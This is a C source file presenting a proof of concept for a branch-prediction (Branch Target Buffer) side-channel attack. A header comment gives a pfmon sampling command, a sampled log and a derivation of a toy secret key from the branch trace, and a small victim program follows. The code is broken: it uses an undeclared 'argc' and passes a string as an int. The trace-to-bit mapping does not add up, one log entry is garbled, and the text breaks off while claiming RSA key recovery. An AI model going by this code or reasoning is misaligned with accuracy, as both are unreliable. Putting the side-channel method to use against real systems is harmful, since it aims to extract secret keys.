/*
 * SBPA Proof-of-Concept
 * -------------------------
 *
 * SBPA is a side-channel attack that is shown to exploit the Branch Target Buffer (BTB)
 * Consider a "victim_process" like this one and imagine that D = 5 is the secret key to an ciphertext
 * We see that this victim_process branches conditionally based on D, and mispredictions this branch will be reflected in the BTB
 *
 * A spy process can first fill the BTB with dummy branches
 * The spy process will measure the execution time of each branch and notice if any of its dummy branches has been evicted
 * An eviction of the spy process branch means a misprediction of the victim_process, meaning the conditional branch on D was taken
 *
 * A command line profiling tool like Pfmon can act as the spy process 
 * Using the GDB debugging tool, we can see the progam's address range
 * We identify the branch target address as 0x40000000000009b0
 * By searching the BTB for this address, we can use Pfmon to perform SBPA via the single-eviction method (most optimal)
 *
 * Simply run this simultaneously with the victim process:
 * pfmon --long-smpl-periods=1 --smpl-entries=100 -e BRANCH_EVENT --irange=0x4000000000000980-0x4000000000000990 -- ./sbpa_proof 10
 *
 * The pfmon output log from the above instruction will contain information that can be used to direcly obtain the private key (D):
 *
 * --- LOG START ---
 *
 * entry 0 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec72853e2 OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 1 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec728747a OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 2 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec7287b67 OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 3 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec7288259 OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 4 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec72888eb OVFL:4 LAST_VAL:1 SET:0 IIP:0x4000000000000890 PMD8 : 0x400000000000097f b=1 mp=1 bru=1 b1=1 valid=y
 * 		source addr=0x4000000000000980
 * 		taken=n prediction=FE failure
 * 		entry 5 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec7288f6f OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 6 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec72895e7 OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 7 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec7289c5f OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000008c1 PMD8 : 0x4000000000000979 b=1 mp=0 bru=0 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=success
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 8 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec728a2d0 OVFL:4 LAST_VAL:1 SET:0 IIP:0x40000000000009f0 PMD8 : 0x400000000000097b b=1 mp=1 bru=1 b1=1 valid=y
 * 		source addr=0x4000000000000982
 * 		taken=y prediction=FE failure
 * 		PMD9 : 0x40000000000009b2 b=0 mp=1 bru=0 b1=0 valid=y
 * 		target addr=0x40000000000009b0
 * entry 9 PID:32006 TID:32006 CPU:2 STAMP:0x114d55ec728a99f OVFL:4 LAST_VAL:1 SET:0 IIP:0x4000000000000a10 PMD8 : 0x400000000000097f b=1 mp=1 bru=1 b1=1 valid=y
 * 		source addr=0x4000000000000980
 * 		taken=n prediction=FE failure
 *
 * --- LOG END ---
 *
 * Notice the "taken" property under each entry
 * The "taken" value of each entry yields the following trace: YYYNYYYYN
 * This corresponds to the bit sequence:                       1111011110
 *
 * There are two zero bits at n = 4 and n = 10 in the reconstructed bit sequence
 * This means the condition j % L == 0 was satisfied when j = 5 and j = 10
 * 
 * So in the expression 5 % D == 0 and 10 % D == 0, D must equal 5
 *
 * This proves that SBPA works and we can use it to decrypt a 1024-bit RSA secret key, as
 */

# define D 5 // "Secret Key"
  
void victim_process(int n) {    // (gdb) 0x4000000000000980
    int a, j;                   // (gdb) 0x4000000000000981
    for (j = 1; j <= n; j++)    // (gdb) 0x4000000000000982
        if (j % D == 0)         // (gdb) 0x40000000000009b0
            a = 1;              // (gdb) 0x4000000000000990
}
  
 int main(int arc, char *argv[]) {
    if (argc == 2) {
        // launch the vicim_process
        victim_process(argv[1]);
    } else {
        return 1;
    } 
 }